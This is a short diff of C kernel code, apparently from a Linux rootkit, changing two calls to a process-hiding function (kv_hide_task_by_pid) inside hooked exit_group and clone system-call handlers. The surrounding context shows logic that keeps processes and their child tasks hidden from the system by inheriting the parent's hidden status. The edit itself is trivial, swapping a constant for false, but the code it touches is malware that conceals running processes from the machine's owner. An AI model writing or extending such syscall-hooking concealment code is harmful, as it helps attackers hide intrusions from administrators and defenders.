@@ -68,7 +68,7 @@ static asmlinkage long m_exit_group(struct pt_regs *regs)
 	} else {
 		// it is regular hidden PID and needs to
 		// be shown before exiting
-		kv_hide_task_by_pid(current->pid, 0, NO_CHILDREN);
+		kv_hide_task_by_pid(current->pid, 0, false);
 	}
 
 resume:
@@ -97,7 +97,7 @@ static asmlinkage long m_clone(struct pt_regs *regs)
 	if (!kv_find_hidden_pid(&status, task->pid)) {
 		kv_hide_task_by_pid(task->pid,
 				    status.saddr, // inherit parent's status
-				    NO_CHILDREN);
+				    false);
 	} else if (hide_once && status.saddr) {
 		// allow 1 task to be hidden
 		// afterwards, but be careful to not
